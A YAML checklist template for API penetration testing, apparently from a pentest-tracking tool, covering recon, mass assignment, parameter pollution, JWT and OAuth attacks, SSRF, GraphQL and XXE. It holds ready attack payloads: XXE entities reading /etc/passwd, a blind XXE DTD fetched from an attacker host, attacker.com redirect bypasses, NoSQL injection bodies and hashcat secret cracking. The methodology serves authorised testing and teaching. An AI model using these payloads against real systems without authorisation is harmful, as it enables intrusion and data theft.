name: "API Security Testing"
version: "2.2.0"
author: "HackMind"
tier: asset
description: >
  API penetration testing methodology built on the PortSwigger Web Security
  Academy API testing learning path. Walks recon and documentation discovery,
  endpoint and parameter interaction, mass assignment, server-side parameter
  pollution, the OWASP API Security Top 10 (2023), GraphQL, and XML/XXE.
  Question nodes branch into technology-specific tests so non-applicable checks
  stay hidden.

nodes:
  # ===========================================================================
  # ORIENTATION
  # ===========================================================================
  - id: api_overview
    type: info
    title: "API Security Testing — orientation"
    content: |
      Point this asset at a single API (one base URL / service). Record the base
      path (e.g. /api, /api/v1), transport (HTTPS enforced?), the authentication
      mechanism, and where the documentation lives.

      Work top to bottom: recon the attack surface first (documentation,
      endpoints, methods, parameters), then work the vulnerability classes
      (OWASP API Top 10) and any technology branches (GraphQL, etc.).

      An API endpoint is a location the API receives requests, e.g.
      `GET /api/books`. For each endpoint learn: what input it takes (required
      and optional parameters), which HTTP methods and media types it supports,
      its rate limits, and its authentication requirements.

  # ===========================================================================
  # API RECON
  # ===========================================================================
  - id: recon
    type: info
    title: "API Recon"
    content: |
      Map the full attack surface before active testing: every endpoint,
      parameter, HTTP method, content type, and auth requirement. The more of
      the API you can see, the more of it you can test.
    children:
      - id: recon_docs
        type: checklist
        title: "Discover API documentation"
        content: |
          APIs often expose documentation — human-readable (for developers) or
          machine-readable (JSON/XML, consumed by tooling). Even a documentation
          endpoint you aren't meant to find is a full map of the attack surface.

          - Check common documentation paths:
            /api, /api/, /api/docs, /api/documentation, /docs, /documentation
            /swagger/index.html, /swagger-ui.html, /swagger-ui/, /swagger/v1/swagger.json
            /openapi.json, /openapi.yaml, /api-docs, /v1/api-docs, /v2/api-docs, /v3/api-docs
            /redoc, /.well-known/openapi
          - Walk parent paths of any known resource. From
            /api/swagger/v1/users/123 also try /api/swagger/v1, /api/swagger, /api
          - Crawl with Burp Scanner and browse manually with Burp's browser
          - Fuzz documentation paths with Intruder using a common-paths wordlist
          - Parse machine-readable specs with the OpenAPI Parser BApp; import
            into Postman or SoapUI to exercise every documented endpoint
          - Search public sources: Postman collections (site:postman.com "target"),
            GitHub, cached Swagger UIs

      - id: recon_endpoints
        type: checklist
        title: "Identify API endpoints"
        content: |
          Even without documentation, recover endpoints from the app that uses
          the API.

          - Crawl the application with Burp Scanner and review the site map
          - Review JavaScript for endpoint references; automate with the
            JS Link Finder BApp. Grep JS for fetch(), axios(), XMLHttpRequest,
            $.ajax(), and URL string literals
          - Look for /api/ patterns and versioned prefixes (/v1/, /v2/)
          - Extract endpoints from mobile app binaries and decompiled sources
          - Automated route brute-force: kiterunner (`kr scan https://{{target_name}}/api/ -w routes-large.kite`)
          - Note every base path and version prefix — old versions often survive

      - id: recon_methods
        type: checklist
        title: "Identify supported HTTP methods"
        scope_tags: [destructive]
        content: |
          A single endpoint path can behave very differently per method:
            GET /api/tasks     -> list tasks
            POST /api/tasks    -> create a task
            DELETE /api/tasks/1 -> delete a task

          - Cycle methods with Burp Intruder's built-in "HTTP verbs" list against
            each endpoint (GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, ...)
          - Send OPTIONS to enumerate allowed methods (Allow response header)
          - Target low-priority / disposable objects to avoid destructive side
            effects (don't DELETE something that matters)
          - Note methods that "work" but aren't documented — often unguarded

      - id: recon_content_types
        type: checklist
        title: "Identify supported content types"
        content: |
          Endpoints may process multiple media types differently. Changing the
          content type can trigger informative errors, bypass flawed input
          filters, or reach a different parser.

          - Change the Content-Type header and reformat the body to match
            (e.g. application/json <-> application/xml, form-encoded)
          - Use the Content Type Converter BApp to convert JSON <-> XML
          - Watch for: verbose parser errors, defenses applied to only one type,
            and XML parsers (pivot to XXE — see the XML branch)

      - id: recon_hidden_endpoints
        type: checklist
        title: "Find hidden endpoints"
        content: |
          Guess undocumented endpoints by varying a known one.

          - From a known endpoint like PUT /api/user/update, fuzz the action
            segment with Intruder (delete, add, remove, create, list, ...)
          - Use wordlists built from common API naming conventions and terms
            drawn from this specific application
          - Test discovered endpoints across all HTTP methods and auth states

  # ===========================================================================
  # HIDDEN PARAMETERS & MASS ASSIGNMENT
  # ===========================================================================
  - id: hidden_params
    type: info
    title: "Finding hidden parameters"
    content: |
      Undocumented parameters often bypass validation or expose privileged
      behaviour the UI never sends.
    children:
      - id: hidden_params_discovery
        type: checklist
        title: "Discover hidden parameters"
        content: |
          - Burp Intruder: replace or append parameters from a wordlist of common
            parameter names and watch for behavioural changes
          - Param Miner BApp: guess up to 65,536 param names per request and
            auto-derive names relevant to this application
          - Burp's content discovery tool to surface unlinked content/params
          - Try parameters in every position: query string, body, JSON keys,
            and headers (e.g. X-Forwarded-For, X-Original-URL)

      - id: mass_assignment
        type: checklist
        title: "Test for mass assignment (auto-binding)"
        content: |
          Frameworks that auto-bind request parameters to internal object fields
          can create hidden, sensitive parameters (e.g. isAdmin, role, balance).

          1. Enumerate object fields — read a GET response for the object:
             GET /api/users/123 ->
             { "id":123, "name":"John Doe", "email":"...", "isAdmin":"false" }
             The id and isAdmin fields are candidate hidden parameters.
          2. Add a candidate to a state-changing request:
             PATCH /api/users/ { "username":"wiener", "isAdmin":false }
          3. Probe with an invalid value to detect binding:
             { ..., "isAdmin":"foo" }  — a different error/response = bound
          4. Send the malicious value:
             { ..., "isAdmin":true }
          5. Verify: browse as the modified user and confirm the unintended
             privilege actually took effect.

          Note both sides: allowlisting updatable properties (or blocklisting
          sensitive ones) is the fix — absence of either is the finding.

  # ===========================================================================
  # SERVER-SIDE PARAMETER POLLUTION
  # ===========================================================================
  - id: sspp
    type: info
    title: "Server-Side Parameter Pollution (SSPP)"
    content: |
      SSPP occurs when the site embeds your input in a server-side request to an
      internal API without adequate encoding, letting you override parameters,
      change behaviour, or reach unauthorised data. Look for it wherever user
      input is relayed onward: query strings, REST path segments, and structured
      bodies (JSON/XML). Automate detection with Burp Scanner and the Backslash
      Powered Scanner BApp; confirm by hand.
    children:
      - id: sspp_query
        type: checklist
        title: "Test SSPP in the query string"
        content: |
          Given a client request GET /userSearch?name=peter&back=/home that the
          server turns into GET /users/search?name=peter&publicProfile=true:

          - Truncate with URL-encoded # (%23):
            name=peter%23foo  -> ...?name=peter#foo&publicProfile=true
            peter still returned = truncation worked (dropped publicProfile=true);
            "Invalid name" = it did not.
          - Inject an extra parameter with URL-encoded & (%26):
            name=peter%26foo=xyz  (unknown param, usually ignored — baseline)
          - Inject a known-valid parameter recovered in recon:
            name=peter%26email=foo  and watch how the response changes
          - Override an existing parameter with a duplicate:
            name=peter%26name=carlos
            Last wins (PHP), both combined "peter,carlos" (ASP.NET), first wins
            (Node/Express). Fingerprint the stack to predict this.
          - Escalate: override with a privileged value, e.g. name=administrator

      - id: sspp_path
        type: checklist
        title: "Test SSPP in REST paths"
        content: |
          When input lands in a server-side URL path, e.g. ?name=peter becomes
          GET /api/private/users/peter:

          - Inject encoded traversal into the reflected path segment:
            name=peter%2f..%2fadmin -> /api/private/users/peter/../admin
            If the backend normalises the path it resolves to .../users/admin.
          - Try %2e%2e%2f, double-encoding, and trailing segments to reach
            sibling resources or actions the caller shouldn't hit.

      - id: sspp_structured
        type: checklist
        title: "Test SSPP in structured data (JSON / XML)"
        content: |
          When your value is spliced into a server-side JSON/XML document without
          escaping, break out of the string and add fields.

          - From form input POST /myaccount name=peter that becomes
            PATCH /users/7312/update {"name":"peter"} , send:
            name=peter","access_level":"administrator
            -> {"name":"peter","access_level":"administrator"}
          - From JSON client input {"name":"peter"}, escape the quotes:
            {"name":"peter\",\"access_level\":\"administrator"}
          - Inject sensitive fields discovered via mass-assignment recon
            (isAdmin, role, access_level, id) and confirm the privilege took hold.
          - For XML-backed requests, break out of the element and inject nodes;
            if an XML parser is reachable, pivot to XXE (see the XML branch).

      - id: nosql_injection
        type: checklist
        title: "NoSQL Injection (JSON bodies)"
        scope_tags: [critical, injection, nosql]
        content: |
          Test JSON login and filter bodies for MongoDB / CouchDB operator injection:
          - {"username": {"$ne": null}, "password": {"$ne": null}}
          - {"username": "admin", "password": {"$gt": ""}}
          - {"username": {"$regex": "^a"}, "password": {"$ne": ""}}  (blind extraction)
          - {"$where": "sleep(5000)"}  (time-based confirmation)
          - Try URL-encoded operators too: username[$ne]=null&password[$ne]=null
          - Test in registration, password reset, and search/filter endpoints.

  # ===========================================================================
  # OWASP API SECURITY TOP 10 (2023)
  # ===========================================================================
  - id: owasp_top10
    type: info
    title: "OWASP API Security Top 10 (2023)"
    content: |
      Work each category against the endpoints mapped during recon. Some
      categories are already handled earlier in this template and are
      cross-referenced rather than repeated (API3 mass assignment lives under
      "Finding hidden parameters"; parts of API8/API9 build on "API Recon").
    children:

      # ---- API1: BOLA -----------------------------------------------------
      - id: api1_bola
        type: info
        title: "API1 — Broken Object Level Authorization (BOLA / IDOR)"
        content: |
          The most common and impactful API flaw: an endpoint returns or acts on
          an object based on an ID in the request without checking the caller owns
          it. Needs at least two accounts (or one account + an unauth session).
        children:
          - id: api1_idor
            type: checklist
            title: "Test object references across accounts"
            content: |
              - Enumerate object identifiers: sequential ints, UUIDs/GUIDs, hashes,
                usernames, filenames. Guessable IDs make this trivial; leaked GUIDs
                (in other responses, logs, JS) make UUIDs exploitable too.
              - With account A's session, request account B's objects by swapping
                the ID: GET /api/orders/1002 , /api/users/{otherId}, ?userId=
              - Test every location an ID appears: path, query, body, JSON keys,
                headers, and nested/related object references.
              - Re-test the same object across different endpoints and HTTP methods
                — authz is often enforced on GET but not PUT/DELETE/PATCH.
              - Try wildcards, arrays, and null (id[]=1&id[]=2, "id":[1,2]).
              - Confirm impact: read/modify/delete another tenant's data.

      # ---- API2: Broken Authentication -----------------------------------
      - id: api2_auth
        type: info
        title: "API2 — Broken Authentication"
        content: |
          Test how the API proves who is calling. Pick the mechanism below to load
          mechanism-specific checks, then run the general credential and MFA checks.
        children:
          - id: q_auth_mechanism
            type: question
            title: "What is the primary API authentication mechanism?"
            options:
              - label: "JWT (JSON Web Token)"
                key: "jwt"
                children:
                  - id: jwt_intro
                    type: checklist
                    title: "JWT recon & tooling"
                    content: |
                      - Locate the JWT (Authorization: Bearer, cookie, body, URL) and
                        decode header.payload.signature (jwt.io / JWT Editor).
                      - Install the Burp JWT Editor extension; create keys in the
                        "JWT Editor Keys" tab for the attacks below.
                      - Read the header alg and any jwk/jku/kid parameters — they drive
                        which attacks apply.
                  - id: jwt_sig_verify
                    type: checklist
                    title: "Flawed signature verification"
                    content: |
                      - Arbitrary signature: tamper a claim (role/isAdmin/sub) and
                        change the signature to garbage. Accepted = server decodes but
                        never verifies.
                      - alg:none: set header "alg":"none", change claims, drop the
                        signature but KEEP the trailing dot (header.payload.). Try case
                        and encoding variants: None, NONE, nOnE.
                  - id: jwt_bruteforce
                    type: checklist
                    title: "Brute-force a weak HMAC secret (symmetric HS* algs)"
                    scope_tags: [brute_force]
                    content: |
                      Applies when the token uses HS256/HS384/HS512.
                      - hashcat -a 0 -m 16500 <jwt> jwt.secrets.list
                        (wordlist: github.com/wallarm/jwt-secrets)
                      - On a hit (<jwt>:<secret>), load the secret into JWT Editor,
                        forge new claims, re-sign HS256, and replay.
                      - Also test default/empty/known secrets.
                  - id: jwt_alg_confusion
                    type: checklist
                    title: "Algorithm confusion RS256 -> HS256 (asymmetric algs)"
                    content: |
                      Applies when the token uses RS*/ES*/PS* (asymmetric).
                      - Obtain the public key: /.well-known/jwks.json, /jwks, a jwk in a
                        token, or derive it from two tokens (JWT Editor / rsa_sign2n).
                      - Convert to PEM; change header alg to HS256; sign the token with
                        the PUBLIC KEY BYTES as the HMAC secret.
                      - If accepted, the server verifies HS256 with the public key it
                        thinks is RSA — full forgery.
                  - id: jwt_header_inj
                    type: checklist
                    title: "JWT header parameter injections (jwk / jku / kid)"
                    content: |
                      - jwk: embed your own public key in the header and self-sign
                        (JWT Editor -> Attack -> "Embedded JWK"). Accepted = server trusts
                        the inline key.
                      - jku: point "jku" at an attacker-hosted JWK Set and sign with your
                        private key. Try SSRF-style bypasses of any allowlist (subdomains,
                        redirects, URL parsing tricks).
                      - kid: path traversal ("kid":"../../../../dev/null" -> sign with an
                        empty HMAC secret) and SQLi ("kid":"x' UNION SELECT ...").
                  - id: jwt_claims
                    type: checklist
                    title: "Claim & expiry handling"
                    content: |
                      - Is exp enforced? Replay an expired token. Tamper iat/nbf.
                      - Are iss/aud validated? Swap tokens between environments/clients.
                      - Are tokens revocable on logout / password change?

              - label: "API key / token"
                key: "apikey"
                children:
                  - id: apikey_checks
                    type: checklist
                    title: "API key handling"
                    content: |
                      - Where does the key travel? Keys in the URL/query leak to logs,
                        history, and Referer — flag it.
                      - Entropy/predictability of the key; can you guess or enumerate one?
                      - Is the key scoped and rate-limited, or does it grant everything?
                      - Search for leaked keys: JS bundles, mobile apps, GitHub, wayback.
                      - Does revocation actually invalidate the key? Test a rotated key.

              - label: "OAuth 2.0 / OpenID Connect"
                key: "oauth"
                children:
                  - id: oauth_recon
                    type: checklist
                    title: "OAuth recon"
                    content: |
                      - Pull config: /.well-known/oauth-authorization-server and
                        /.well-known/openid-configuration (grant types, endpoints,
                        scopes, response modes, dynamic registration).
                      - Identify authorization/token/userinfo endpoints and the params
                        in play: client_id, redirect_uri, response_type, scope, state.
                  - id: oauth_redirect_uri
                    type: checklist
                    title: "redirect_uri validation"
                    content: |
                      - Point redirect_uri at an external/attacker domain; watch for the
                        code/token leaking there.
                      - Bypasses: path traversal (/callback/../../), localhost.attacker.com,
                        attacker.com.legit.com, https://legit.com&@attacker.com,
                        https://legit.com#@attacker.com, duplicate redirect_uri params.
                      - If validation holds, chain an open redirect / XSS on an allowed
                        path to exfiltrate the code (Referer, img, JS).
                  - id: oauth_state
                    type: checklist
                    title: "state / CSRF protection"
                    content: |
                      - Is state present, random, and validated on callback? Missing or
                        static state = OAuth CSRF (force-link attacker account).
                  - id: oauth_scope_authcode
                    type: checklist
                    title: "Scope upgrade (authorization code flow)"
                    content: |
                      Applies to the authorization code grant.
                      - At POST /token, add extra scopes (scope=openid email profile)
                        beyond what was approved. If the token honours them, scope
                        validation is broken.
                      - Steal-code flow: an accepted external redirect_uri lets you
                        capture a victim's code and replay it to the real callback — no
                        client secret needed.
                  - id: oauth_implicit
                    type: checklist
                    title: "Implicit-flow token handling"
                    content: |
                      Applies to the implicit grant (response_type=token).
                      - Token rides in the URL fragment (#) — exposed to history/JS.
                      - If the app POSTs {access_token,user_id,email} to log in, swap
                        user_id/email to a victim's while keeping your token — server may
                        trust unvalidated identity fields.
                      - Reuse a token against /userinfo with an inflated Scope header.
                  - id: oidc_checks
                    type: checklist
                    title: "OpenID Connect issues"
                    content: |
                      Applies when an id_token / openid-configuration is present.
                      - Unprotected dynamic client registration: POST /register with
                        {"redirect_uris":["https://attacker.com/cb"]} — credentials issued
                        without auth?
                      - Authorization by reference: request_uri=https://attacker/req.jwt
                        (SSRF / parameter injection).
                      - id_token is a JWT — run the JWT checks against it.

              - label: "HTTP Basic / Digest"
                key: "basic"
                children:
                  - id: basic_checks
                    type: checklist
                    title: "Basic / Digest auth"
                    content: |
                      - Credentials are only base64-encoded — decode and confirm they are
                        never sent over cleartext HTTP.
                      - Replay the Authorization header; check it works from any IP/session.
                      - No rate limiting = credential brute-force exposure (see below).

              - label: "Session cookie"
                key: "session"
                children:
                  - id: session_checks
                    type: checklist
                    title: "Session cookie handling"
                    content: |
                      - Cookie flags: Secure, HttpOnly, SameSite. Predictable/short session
                        IDs? Session fixation (does the ID rotate on login)?
                      - Is the session invalidated server-side on logout and password change?

              - label: "None / multiple / other"
                key: "none"
                children:
                  - id: auth_none_checks
                    type: checklist
                    title: "Unauthenticated or mixed surface"
                    content: |
                      - Can sensitive endpoints be reached with no credentials at all?
                      - If multiple mechanisms coexist, test each and look for endpoints
                        that accept a weaker one than intended.

          - id: password_login
            type: checklist
            title: "Credential login weaknesses"
            scope_tags: [brute_force]
            content: |
              Applies wherever a username/password login backs the API.
              - Username enumeration: compare responses/timing/status for valid vs
                invalid users on login and password-reset endpoints.
              - Brute-force + credential stuffing against known users with a
                password wordlist.
              - Flawed lockout: does it reset over time, or only limit per-IP?
                Bypass with X-Forwarded-For / X-Real-IP rotation.

          - id: q_mfa
            type: question
            title: "Does authentication involve MFA / 2FA (OTP, TOTP, email/SMS code)?"
            options:
              - label: "Yes"
                key: "yes"
                children:
                  - id: mfa_bypass
                    type: checklist
                    title: "2FA bypass & logic flaws"
                    content: |
                      - Reach protected endpoints after the password step but before the
                        2FA step — is a full session issued too early?
                      - Drop the code parameter, submit another user's code, or verify
                        against a response that leaks correctness.
                      - Does 2FA apply to every sensitive endpoint, or only some?
                  - id: mfa_otp_bruteforce
                    type: checklist
                    title: "Brute-force OTP / verification codes"
                    scope_tags: [brute_force]
                    content: |
                      - Short OTPs (4-6 digits): is the verify endpoint rate-limited?
                      - Do codes expire and get invalidated after use, or can they be
                        replayed / guessed within a long window?
              - label: "No"
                key: "no"
                children: []

      # ---- API3: BOPLA ----------------------------------------------------
      - id: api3_bopla
        type: info
        title: "API3 — Broken Object Property Level Authorization"
        content: |
          Property-level authorization: which fields a caller may read or write.
          Two halves — mass assignment (write) and excessive data exposure (read).
        children:
          - id: api3_mass_assignment_ref
            type: info
            title: "Mass assignment — see 'Finding hidden parameters'"
            content: |
              The write side (auto-binding privileged fields like isAdmin/role) is
              covered by the "Test for mass assignment" checklist under
              "Finding hidden parameters" earlier in this template. Do it here if
              you skipped it.
          - id: api3_excessive_data
            type: checklist
            title: "Excessive data exposure (read side)"
            content: |
              - Inspect raw API responses, not just what the UI renders — endpoints
                often return whole objects and let the client filter.
              - Hunt for sensitive fields the caller shouldn't see: password hashes,
                tokens, other users' PII, internal flags, isAdmin, account balances.
              - Compare responses for the same object at different privilege levels.

      # ---- API4: Unrestricted Resource Consumption ------------------------
      - id: api4_resource
        type: info
        title: "API4 — Unrestricted Resource Consumption"
        content: |
          Missing limits on the resources a request can consume (requests, CPU,
          memory, money — SMS/email quotas).
        children:
          - id: api4_rate_limits
            type: checklist
            title: "Rate limiting & resource limits"
            scope_tags: [dos]
            content: |
              - Are requests rate-limited per user/IP/key? Replay a request in a
                loop and watch for 429s.
              - Abuse pagination/query limits: page size, limit=, ?fields= to force
                huge responses; unbounded arrays or deep JSON as input.
              - Expensive operations (search, export, report) without throttling.
              - Long string inputs / complex regexes to trigger ReDoS
                (e.g. `(a+)+$` against a naive matcher).
              - Actions that cost money/quota (send SMS, email, push) with no cap.
          - id: api4_race
            type: checklist
            title: "Race conditions"
            content: |
              - Fire concurrent requests at state-changing endpoints (redeem code,
                apply discount, transfer, withdraw) to exceed intended limits.
              - Use Burp Repeater "send group in parallel" (single-packet attack).

      # ---- API5: BFLA -----------------------------------------------------
      - id: api5_bfla
        type: info
        title: "API5 — Broken Function Level Authorization"
        content: |
          Can a lower-privileged (or unauthenticated) caller invoke privileged
          functions? Function-level, as opposed to API1's object-level.
        children:
          - id: api5_checks
            type: checklist
            title: "Access privileged functions as a low-priv user"
            content: |
              - Enumerate admin/privileged endpoints (/api/admin, /internal,
                /api/v1/users/{id}/roles) from recon, JS, and docs.
              - Call them with a low-privilege (and no-auth) token and see what runs.
              - Swap HTTP methods: a GET may be blocked while PUT/DELETE/POST is not.
              - Guess sibling admin actions (promote, disable, impersonate, export).
              - Combine with API1: reach another object AND a privileged function.

      # ---- API6: Sensitive Business Flows ---------------------------------
      - id: api6_business_flows
        type: info
        title: "API6 — Unrestricted Access to Sensitive Business Flows"
        content: |
          Business flows that are fine used normally but harmful when automated at
          scale (purchasing, signups, comments, voting, referrals).
        children:
          - id: api6_checks
            type: checklist
            title: "Test for unrestricted automation of sensitive flows"
            content: |
              - Identify high-value flows and whether the API exposes them directly,
                skipping UI-side protections (CAPTCHA, device checks, step order).
              - Can the flow be scripted with no throttling — bulk-buy limited stock,
                mass-create accounts, spam, inflate votes/referrals?
              - Test skipping/reordering steps in multi-step flows via direct API calls.

      # ---- API7: SSRF (gated) --------------------------------------------
      - id: q_api7_ssrf
        type: question
        title: "API7 — Does the API accept or fetch URLs (webhooks, callbacks, URL import, image/PDF from URL)?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: api7_ssrf_sinks
                type: checklist
                title: "Identify URL sinks & reach internal targets"
                content: |
                  - Find URL-consuming params: webhook/callback URLs, "import from
                    URL", fetch-image/avatar-by-URL, PDF/screenshot generators, SSO
                    metadata URLs, jku/request_uri (see JWT/OAuth).
                  - Point them at internal targets: http://127.0.0.1, http://localhost,
                    internal IP ranges, and cloud metadata:
                    http://169.254.169.254/latest/meta-data/ (AWS),
                    http://metadata.google.internal/ (GCP).
              - id: api7_ssrf_bypass
                type: checklist
                title: "Blind SSRF & filter bypasses"
                content: |
                  - Blind SSRF: use an out-of-band host (Burp Collaborator) to confirm
                    the server made the request.
                  - Bypass filters: alternative IP formats (decimal/octal/IPv6),
                    http://127.0.0.1.nip.io, open redirects, DNS rebinding, and URL
                    parser confusion.
          - label: "No"
            key: "no"
            children: []

      # ---- API8: Security Misconfiguration --------------------------------
      - id: api8_misconfig
        type: info
        title: "API8 — Security Misconfiguration"
        content: |
          Config-level weaknesses across the stack. Some overlaps recon (methods,
          content types) — do those there and the rest here.
        children:
          - id: api8_cors
            type: checklist
            title: "CORS"
            content: |
              - Reflect an arbitrary Origin and check Access-Control-Allow-Origin;
                test null origin and whether Allow-Credentials:true is paired with a
                reflected/overly-broad origin.
          - id: api8_headers_errors
            type: checklist
            title: "Headers, errors & debug surface"
            scope_tags: [version_disclosure]
            content: |
              - Verbose errors / stack traces / framework banners leaking versions
                and internal paths.
              - Missing security headers; debug or actuator endpoints exposed
                (/actuator, /debug, /console, /swagger in prod).
              - Default credentials on any admin/management interface.
          - id: api8_host_header
            type: checklist
            title: "HTTP Host header attacks"
            content: |
              - Tamper Host / X-Forwarded-Host and watch for it reflected into
                links, password-reset URLs, or cache keys (routing/poisoning).

      # ---- API9: Improper Inventory Management ----------------------------
      - id: api9_inventory
        type: info
        title: "API9 — Improper Inventory Management"
        content: |
          Old versions, forgotten hosts, and undocumented endpoints widen the
          attack surface. Builds on API Recon.
        children:
          - id: api9_checks
            type: checklist
            title: "Enumerate versions, environments & deprecated endpoints"
            content: |
              - Enumerate API versions (v1/v2/v3, /beta, /internal) — older versions
                are often unpatched and skip newer authz. Retest findings on each.
              - Find non-production hosts: dev/staging/uat/test/sandbox subdomains,
                which frequently expose the same API with weaker controls.
              - Locate deprecated/undocumented endpoints still live (see recon,
                JS analysis, wayback, and the spec diff between versions).

      # ---- API10: Unsafe Consumption of APIs ------------------------------
      - id: api10_unsafe_consumption
        type: info
        title: "API10 — Unsafe Consumption of APIs"
        content: |
          The target trusts data from third-party/upstream APIs it integrates with.
        children:
          - id: api10_checks
            type: checklist
            title: "Test trust of upstream/third-party data"
            content: |
              - Identify integrations (payment, KYC, geocoding, social, partner APIs)
                whose responses feed the target.
              - Where you can influence that upstream data, test injection (SQLi/XSS/
                template) reaching the target through the integration.
              - Does the target blindly follow redirects or accept unvalidated
                upstream responses? Is upstream traffic over TLS?

  # ===========================================================================
  # GRAPHQL (gated)
  # ===========================================================================
  - id: q_graphql
    type: question
    title: "Does the API expose a GraphQL endpoint?"
    options:
      - label: "Yes"
        key: "yes"
        children:
          - id: gql_discovery
            type: checklist
            title: "Find & fingerprint the GraphQL endpoint"
            content: |
              - Probe common paths: /graphql, /api, /api/graphql, /graphql/api,
                /graphql/graphql, plus /v1/ variants and .../graphql.
              - Universal detection: send query{__typename}. A GraphQL endpoint
                replies {"data":{"__typename":"query"}} (every endpoint has the
                reserved __typename field).
              - Try each transport — the server may only guard some: POST
                application/json, GET with URL-encoded query, POST
                x-www-form-urlencoded.
              - Review Burp HTTP history for queries the app already sends.
              - Tools: InQL, GraphQL Voyager for mapping.

          - id: gql_introspection
            type: checklist
            title: "Discover the schema (introspection & suggestions)"
            content: |
              - Probe: {"query":"{__schema{queryType{name}}}"}. If it works, run the
                full introspection query for all queries/mutations/subscriptions/
                types/directives. If the full query errors, remove the onOperation,
                onFragment, and onField directives.
              - Visualize the result (GraphQL Voyager / InQL) to map types and
                relationships, and flag sensitive fields (email, tokens, user IDs).
              - If introspection is disabled, harvest field names from Apollo
                "Did you mean ...?" suggestions and recover the schema with
                Clairvoyance.

          - id: gql_private_data
            type: checklist
            title: "Access private data via unsanitized arguments (IDOR)"
            content: |
              - Query objects directly by argument even when a listing hides them:
                query { product(id: 3) { id name listed } }
              - Enumerate IDs the UI omits (unpublished/deleted/other-user objects);
                the argument often bypasses the access control the list applied.
              - Repeat across every id-taking query and mutation.

          - id: gql_defense_bypass
            type: checklist
            title: "Bypass introspection filters & rate limits"
            content: |
              - Introspection regex bypass: insert a special character after
                __schema — newline (__schema\n{queryType{name}}), space, or comma.
              - Method/content-type bypass: if POST+json is filtered, retry
                introspection as GET or POST x-www-form-urlencoded.
              - Rate-limit bypass with aliases — run many operations in one HTTP
                request so per-request limiters miss them:
                  query {
                    a: isValidDiscount(code:$c){ valid }
                    b: isValidDiscount(code:$c){ valid }
                  }

          - id: gql_batching_bruteforce
            type: checklist
            title: "Alias-based batching for brute-force"
            scope_tags: [brute_force]
            content: |
              - Batch many attempts (codes, credentials, 2FA) into a single request
                via aliases to defeat request-count rate limiting:
                  query { a:login(pw:"0000"){ok} b:login(pw:"0001"){ok} ... }
              - Also test JSON-array query batching if the server accepts it.

          - id: gql_csrf
            type: checklist
            title: "GraphQL CSRF"
            content: |
              - Vulnerable when the endpoint accepts GET or POST
                x-www-form-urlencoded AND enforces no CSRF token.
              - Confirm the endpoint doesn't require application/json; if it accepts
                form-encoded/GET, craft a cross-site request that runs a mutation.
      - label: "No"
        key: "no"
        children: []

  # ===========================================================================
  # XML / XXE (gated)
  # ===========================================================================
  - id: q_xml
    type: question
    title: "Does the API accept XML input (application/xml, text/xml, SOAP, or SVG/Office uploads)?"
    options:
      - label: "Yes"
        key: "yes"
        children:
          - id: xml_xxe_files
            type: checklist
            title: "XXE — retrieve files"
            content: |
              Test each XML data node in turn; any field may reflect the entity.
              - Define an external entity and reference it in a reflected field:
                  <?xml version="1.0"?>
                  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                  <stockCheck><productId>&xxe;</productId></stockCheck>
              - Targets: /etc/passwd, config files, .env, app source.
              - Watch for file contents in the response, revealing errors, or delays.

          - id: xml_xxe_ssrf
            type: checklist
            title: "XXE — SSRF to internal / metadata"
            content: |
              - Point the entity at internal or cloud targets:
                  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM
                    "http://169.254.169.254/latest/meta-data/"> ]>
              - Reach internal services, admin panels, and use timeouts to port-scan.

          - id: xml_xxe_blind
            type: checklist
            title: "Blind XXE — out-of-band & error-based"
            content: |
              When entity values aren't reflected:
              - OOB exfiltration via an attacker-hosted external DTD; confirm the
                callback with Burp Collaborator:
                  <!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd; ]>
              - Error-based: load a local file into a parameter entity and trigger a
                parse error that echoes its contents in the error message.

          - id: xml_surface
            type: checklist
            title: "Hidden XML attack surface"
            content: |
              - Content-type switch: resend a JSON/form request as text/xml (see
                "Identify supported content types") and check for XML parsing.
              - XInclude when you only control part of the document:
                  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
                    <xi:include parse="text" href="file:///etc/passwd"/></foo>
              - Embedded XML in uploads: SVG images, DOCX/XLSX (zipped XML), SOAP.
              - XML structured injection (breaking out of elements to inject nodes)
                overlaps the structured-data SSPP checks — test both.
      - label: "No"
        key: "no"
        children: []
